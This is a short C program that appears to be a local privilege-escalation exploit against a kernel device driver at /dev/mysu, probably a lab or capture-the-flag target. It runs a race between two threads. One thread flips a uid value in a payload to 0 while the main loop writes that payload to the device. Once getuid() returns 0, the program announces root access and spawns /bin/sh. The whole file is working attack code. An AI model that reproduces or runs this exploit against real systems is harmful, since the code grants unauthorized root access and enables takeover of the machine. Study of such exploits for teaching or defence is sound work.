#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>


struct thread_args {
    uint16_t* payload;
    uint8_t* is_done;
};


void* flipper(void* arguments)
{
    struct thread_args* ta = (struct thread_args *)arguments;
    while (!*(ta->is_done))
        ta->payload[0] = 0;
    return 0;
}


int main(int argc, char *argv[])
{
    pthread_t flipper_thread;
    
    char payload[] = { 0xe9, 0x03, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
    uint8_t is_done = 0;
    struct thread_args arguments;
    arguments.payload = (uint16_t*)payload;
    arguments.is_done = &is_done;

    printf("[*] Opening /dev/mysu\n");
    int fd = open("/dev/mysu", O_RDWR);
    if (!fd) {
        printf("[-] Failed to open /dev/mysu\n");
        return 0;
    }
    
    printf("[*] Starting the race...\n");

    int ret = pthread_create(&flipper_thread, NULL, flipper, (void*)&arguments);

    while (!is_done) {
        arguments.payload[0] = 0x3e9;
        write(fd, payload, sizeof(payload));
	    if (getuid() == 0)
		    is_done = 1;
    }

    close(fd);
    printf("[*] Done. Waiting for the thread to finish...\n");
    pthread_join(flipper_thread, NULL);
    printf("[+] Got root access... Spawning a shell\n");
    system("/bin/sh");

    return 0;
}
